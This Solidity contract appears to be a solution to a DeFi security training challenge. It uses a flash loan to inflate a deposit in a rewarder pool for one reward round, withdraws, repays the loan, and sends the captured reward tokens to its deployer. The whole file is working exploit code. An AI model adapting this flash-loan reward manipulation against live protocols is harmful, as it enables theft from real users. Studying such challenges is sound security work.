pragma solidity ^0.6.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";
import "./RewardToken.sol";


contract Attack {

    FlashLoanerPool public flashLoanerPool;
    TheRewarderPool public theRewarderPool;
    DamnValuableToken public liquidityToken;
    RewardToken public rewardToken;
    uint256 amount;
    address owner;
    
    constructor(address _flashLoanerPoolAddress, address _theRewarderPoolAddress, address _liquidityToken, address _rewardToken) public {
        flashLoanerPool = FlashLoanerPool(_flashLoanerPoolAddress);
        theRewarderPool = TheRewarderPool(_theRewarderPoolAddress);
        liquidityToken = DamnValuableToken(_liquidityToken);
        rewardToken = RewardToken(_rewardToken);
        owner = msg.sender;
    }

    function executeLoan() public {
        // borrow all?
        amount = liquidityToken.balanceOf(address(flashLoanerPool));
        flashLoanerPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 _amount) public {
        // deposit
        liquidityToken.approve(address(theRewarderPool), _amount);
        theRewarderPool.deposit(_amount);
        theRewarderPool.distributeRewards();
        theRewarderPool.withdraw(_amount);
        //require(rewardToken.balanceOf(address(this)) >= 100 ether, "Reward not big enough.");
        // return the loan
        liquidityToken.transfer(address(flashLoanerPool), _amount);
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }
}